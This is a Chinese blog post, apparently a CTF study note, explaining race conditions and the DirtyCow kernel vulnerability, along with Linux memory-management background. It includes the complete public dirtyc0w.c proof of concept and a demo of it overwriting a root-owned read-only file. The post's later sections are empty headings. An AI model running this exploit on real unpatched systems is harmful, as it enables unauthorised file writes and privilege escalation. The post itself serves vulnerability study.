---
title: 条件竞争学习 之 DirtyCow分析
date: 2019-11-18 00:00:00
categories:
- CTF/Pwn
tags: dirtycow
---

## 条件竞争简介

[Race Condition](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction-zh/)

参考CTF Wiki：条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现bug。条件竞争的条件：

1. 并发
2. 共享对象
3. 改变对象

所以当竞争的共享对象是内存中变量时，条件竞争可以算作内存破坏漏洞。分析条件竞争就是分析两个并发的线程/进程在不断的对共享对象做什么？更简单的说，条件竞争就是分析两个/多个“不断”。

> 突然想到侧信道攻击的条件，不需要并发，不需要改变对象，只需要能读取到共享对象即可

## CTF Wiki中的练习

[构造例子](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/problem-zh/)

跟着完成了一遍这个例子，总结一下就是利用条件竞争使得漏洞程序可以执行到一个可以栈溢出的漏洞函数，进而getshell。完成这里的例子测试中发现sleep不用0.000008，随便用个1，一样可以达到效果。不过我觉得这里的例子的情景说明的不是很清楚，仔细分析一下，这里的漏洞进程和攻击者进程都是我们自己运行起来的，其中：

- 受害者进程：循环启动./test fake的脚本进程
- 攻击者进程：循环拷贝和删除文件的脚本进程
- 共享资源是：fake文件

条件竞争中，分清进程和线程间的角色，是理解这种漏洞如何利用的关键。分析的目标是受害者进程，构造的是攻击者进程。因为条件竞争本身是一种时间维度上的漏洞，要求是并发，所以这两个进程需要拼命的循环，才可能巧合遇到攻击者进程控制的共享资源可以攻击到受害者进程。所以在CTF中，web中的条件竞争漏洞考察的次数比较多，因为可以通过访问不同页面达到启动两个不同的进程，通过快速多次访问两个不同的功能达到并发的条件。而在Pwn题目中，可以让选手操作一个可以循环的攻击者进程的情景不是很好操作，所以在Pwn中的条件竞争一般要放到线程中出题，便于构造漏洞。

如果想把这道题目作为一道CTF题目让选手做，可以把受害者进程循环启动起来，构造沙盒让选手可以上传攻击的二进制文件并且可以循环运行，但是不可以访问到flag或者让攻击者进程调试到受害者进程。

## DirtyCow分析

冬令营听了两遍DirtyCow还是不太懂，这次决定借着学习条件竞争的机会搞懂这个很出名的漏洞。首先介绍一下DirtyCow，其CVE编号：CVE-2016-5195。Linux内核的内存子系统在处理写入时复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。影响版本2.6.22到4.8.3, 4.7.9, 4.4.26之前。首先通过这次的学习总结一下这个漏洞的情景和原理：

### 漏洞情景

利用DirtyCow漏洞可以任意修改文件系统中当前用户没有写权限的文件，即任意文件的写操作，从而使得攻击者从一个低权限的用户提升到一个高权限的用户。其中：

- 受害者线程：不断写内存的一个线程，这个内存区域是要更改的只读文件的内存映射
- 攻击者线程：不断通知操作系统，只读文件的内存映射的这片内存当前进程不再使用的一个线程
- 共享对象是：两个线程属于同一个进程，该进程的页表项是两个线程的共享对象

所以可见所谓的受害者线程，还是攻击者自己写的，那到底怎么个受害法呢？攻击者自己害自己？因为这里其实我们攻击的角色是操作系统，受害者线程里的写内存的代码是操作系统的系统调用。攻击者构造了两个线程，利用攻击者线程中系统调用代码，攻击受害者线程里的系统调用的代码，从而导致受害者线程中的系统调用的代码执行出错，修改了一个只读文件的内容。所以受害者其实是操作系统。

### 在线实验平台

- [脏牛内核提权漏洞分析 CVE-2016-5195](https://www.ichunqiu.com/experiment/catalog?id=100256)
- [利用Dirty Cow实现Docker逃逸](https://www.ichunqiu.com/experiment/catalog?id=100295)

### 漏洞原理概括

控制分配的页表的写意图标记位在某个时刻会被丢掉，如果这时利用一个线程清空页表，再次进行缺页处理时，则会把PageCache作为该页的物理地址，页表虽然没有标记可写，但是可以硬写。写入之后由于PageCache的回写机制，会将修改返回真实文件。

参考：

- [从内核角度分析Dirty Cow原理](https://bbs.pediy.com/thread-218797.htm)
- [DirtyCow Linux权限提升漏洞分析](https://blog.csdn.net/bme314/article/details/79504248?utm_source=blogxgwz4)

> 最重要的是两个线程的操作：一个线程调用write(2)写/proc/self/mem，另一个线程调用madvice(MADV_DONTNEED)。由于这两个线程操作的相互竞争，当wirte(2)直接修改基于文件的内存映射时（即使涉及到的文件不允许被攻击者进程写）会产生一个安全问题，最终导致提权。

> 其实具体说可能有点绕，就是foll_write标志在row特性执行后去掉了，但是再次执行时却没有检查页表项的有效性，导致我们可以利用另一个线程清空页表。清空的页表由于没有了foll_write权限要求，再次被分配时就不执行row执行机制，导致原本不应该本写的地址拥有了写的权限。

### PoC代码理解

这漏洞的PoC非常短，用法如下：

```bash
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
```

PoC如下：

```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}

void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}

int main(int argc,char *argv[])
{
  if (argc<3)return 1;
  pthread_t pth1,pth2;
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```

可见这个PoC的代码也非常简单易懂，需要了解linux的6个系统调用，可以通过man手册查询：

- open:  打开一个文件系统中的文件，返回文件描述符
- write: 向打开的文件描述符中，写相应的内容
- fstat: 获得文件描述符指向的文件的更多信息，如文件大小等
- mmap:  通过文件描述符，将已经打开的文件映射到内存中
- lseek: 按照偏移更改文件描述符的指针
- madvise: 将自己的主动的控制内存的行为告知操作系统内核

这里首先main函数打开要修改的文件，并且以只读和私有方式映射到内存中（正常操作时用open方法打开的文件不会加载到用户态的内存中），然后启动两个线程，procselfmemThread线程不断写那段内存，madviseThread线程不断释放那段内存。所以关键的就是分析两个不断：

- 怎么个不断写内存？
- 又怎么个不断释放内存？

而且我们要修改的是文件，是文件系统的中的概念，物理的存储在磁盘上，那么为什么我们这里不断修改内存，最终会影响磁盘上的内容呢？我们并没有对main函数里open的那个文件进行任何的修改呀！所以想要搞懂DirtyCow的工作原理，必须要明白相关的linux的内存管理机制，也就是要明白这个漏洞是linux的内核漏洞，要分析操作系统的代码。而且这里我们不能仅仅分析操作系统给每个程序划分的4G虚拟的内存空间了（32位下），还要分析真实的物理内存，即对应到电脑上的内存条上的地址。为了回答上面的三个问题，我们要掌握基本的linux内存管理的相关机制。

### 相关的linux内存管理机制

#### 聊聊操作系统

操作系统是帮助用户来和硬件打交道，管理内存条怎么使用的功能就是内存管理。但是在我们平时编写程序的时候，我们已经忽略了这些硬件的存在，我们关注的是变量，代码逻辑，甚至是更抽象的一些组件，如android的activity等。因为操作系统已经把计算机这些硬件抽象成了进程，文件系统，IO。然后操作系统上面的软件，SDK等继续抽象，有了各种对象，组件，框架。但是如果我们要真正的理解计算机，就要把这些抽象再具体对应到计算机的硬件，以及这些硬件都干了什么。

比如操作系统通过进程管理CPU和内存，通过文件系统来管理硬盘，通过IO来管理外设。但是这些抽象和硬件其实不是一一对应的关系，就像在管理进程的时候，进程是需加载到内存中的，所以进程的这个抽象就会涉及到CPU和内存的管理。再有就是文件系统，操作系统通过文件系统来管理外部存储设备，如硬盘等，但这个只是理论上的抽象。linux的虚拟文件系统中的伪文件系统proc就是特例，用户可以通过读写这个文件系统里的文件，直接看到一些进程，内存或者硬件的相关信息，这些信息是操作系统内核提供的，而不是真正存在于物理存储设备上。

小时觉得买个U盘插到电脑上，弹出的新加卷就是这个U盘的全部，其实这个是因为操作系统将U盘上的文件系统展示给用户的这么一个过程，U盘上到底存了什么，怎么存的，已经被操作系统屏蔽掉了。所以我们每天打开的C盘D盘E盘，linux下的各种目录，只是操作系统想让你看到的，所以你看到的文件不一定存在于物理设备上，看不到的也不一定就不存在，这一切都取决于操作系统提供的文件系统到底怎么实现的。这个不那么“实在”的文件系统，在linux称之为linux的虚拟文件系统。

#### Linux虚拟文件系统

**一切皆文件**是Unix/Linux的基本哲学之一。但是显然，一切本身并不是真的都是文件。所以linux就设计了一种映射，把各种资源映射成文件，然后封装好统一的操作界面，这个机制就是linux的虚拟文件系统（Virtual File System, 简称 VFS），一图胜千言：

![image](https://xuanxuanblingbling.github.io/assets/pic/race/vfs.png)

可见我们常见的存储介质，U盘硬盘等，直接用linux进行读取时，被划分为基于块设备的文件文件系统。这个还是比较好理解的，是真的在硬件上存储了相应的文件。其中伪文件系统的proc文件系统是比较典型且常见的，这个文件系统主要是为了用户可以查看到一些进程，内存，网络等相关信息：

- /proc/net/arp          包含了内网机器信息
- /proc/net/tcp          包含了tcp端口信息
- /proc/cpuinfo          包含了cpu信息
- /proc/version          包含了系统版本信息
- /proc/pid/cmdline      包含了用于开始进程的命令
- /proc/pid/cwd          包含了当前进程工作目录的一个链接
- /proc/pid/environ      包含了可用进程环境变量的列表 
- /proc/pid/exe          包含了正在进程中运行的程序链接
- /proc/pid/fd/          这个目录包含了进程打开的每一个文件的链接
- /proc/pid/stat         包含了进程的状态信息;
- /proc/pid/statm        包含了进程的内存使用信息 
- /proc/self/maps        进程虚拟内存中加载的文件和库等
- /proc/self/mem         这个文件是一个指向当前进程的虚拟内存文件的文件，当前进程可以通过对这个文件进行读写以直接读写虚拟内存空间

#### 虚拟内存管理

说回内存管理，我们知道硬件上我们只有一个内存条，如果所有进程都利用真实的物理地址去使用内存条来管理内存是不可能的，因为内存是有限的，而需求是无限的。所以现代操作系统都采取虚拟内存的方式来进行进程的内存管理。也就是说以进程自己的视角来看的内存是独立的，每个进程都可以全部的4G内存空间（32位下），这里就是因为操作系统提供了虚拟内存的这样一个机制。

而且进程的虚拟内存空间会被分成不同的若干区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠。在linux内核中，这样的区域被称之为虚拟内存区域(virtual memory areas，简称 VMA）。在这个机制下，每个进程都有了自己的虚拟地址空间，但是最终还是要真正的存储在物理的内存条上，所以虚拟空间中的地址一定要有一种对应关系，对应到物理的内存上。于是就有了：

- 段式内存管理
- 页式内存管理
- 段页式内存管理

我们主要介绍页式内存管理

#### 页式内存管理

页式内存管理中把虚拟内存和物理内存都划分为长度大小固定的页，虚拟的内存只在逻辑上存在，物理的页（也称之为页框，页帧）真实的存在于内存条上，把虚拟内存页和真实的物理内存页的对应关系存储成一张表，就是页表，可以把页表想象成存放在内存中的一个大数组。

![image](https://xuanxuanblingbling.github.io/assets/pic/race/page.png)

所以每个进程要去访问一个内存上的值，操作系统根据进程访问的虚拟内存地址，需要根据页表对应查找的对应的物理地址。这个页表是每个进程都有的一个大数组，操作系在统物理内存中分配这段空间，并将这个大数组的起始地址存储到页表基址寄存器。这样即可通过查询页表将进程虚拟空间中的逻辑地址转换为内存条上的物理地址。

#### 缺页中断

但是物理内存是有限的，操作系统会给某个进程分配固定数量的页框供进程使用，所以进程用到的逻辑页面的个数肯定要比分配到的物理页框的个数要多，但因为程序的执行是有空间局部性和时间局部性，所以在时间维度上可以暂时将不需要的页面从物理页框中换出到磁盘上（**注意：这里出现了外部存储设备！**），但是在逻辑内存空间中，即进程自己看到的内存空间中，进程自己是感受不到的，进程自己觉得自己的4G内存空间用的非常好。当进程访问到一个逻辑页面时，操作系统去查页表，发现这个逻辑页面不在进程中，那么则会去磁盘上找到刚才换出的页面，重新加载到内存，然后修好页表，然后重新去用逻辑地址查找这个物理地址，这个过程就是缺页中断。

![image](https://dovahyol.github.io/blog/images/osm5.png)

> 图片来自于由清华大学陈渝和向勇老师主讲的[操作系统](http://www.xuetangx.com/courses/TsinghuaX/30240243X/2015_T1/about)的MOOC课程


#### mmap系统调用

- [mmap为什么比read/write快(兼论buffercache和pagecache)](https://www.cnblogs.com/zhaoyl/p/5515317.html)
- [认真分析mmap：是什么 为什么 怎么用](https://www.cnblogs.com/huxiao-tee/p/4660352.html)

#### 内存映射与写时复制

[Linux系统编程——内存映射与写时复制](https://blog.csdn.net/puliao4167/article/details/87894191)

内存映射就是将虚拟内存中的一块区域与磁盘上的对象建立关联以初始化虚拟内存区域的内容，即mmap这个系统调用。有两种映射

- 文件映射：讲一个文件的一部分直接映射到调用进程的虚拟内存中
- 匿名映射：一个映射没有对应的文件（也可以理解成一个内容总是被初始化为零的虚拟文件的映射）

一个进程的映射中的内存可以与其他进程中的映射共享，当两个或者多个进程共享相同的物理分页时候，每个进程都可以对其做修改和读取，此时就会出现一致性问题，由此，映射的方法又可以分为共享和私有：

- 私有映射：在映射内容上发生的变更对其他进程不可见，对于文件映射来说即为不会在物理页面（底层）更改。此时就会利用写时复制技术（COW）来实现，**这的写时复制和fork那个写时复制情景不一样**
- 共享映射：在映射内容上发生的变更会对所有共享同一个映射的其他进程可见

#### PageCache

- [聊聊 Linux IO](https://www.0xffffff.org/2017/05/01/41-linux-io/)

如果不介绍PageCache讲DirtyCow，那这个漏洞一定是没有讲解到闭环。正因为PageCache的机制，才使得DirtyCow可以真正的去修改磁盘上的文件。



### 漏洞原理详解

### PoC代码再理解

### 完整利用工具









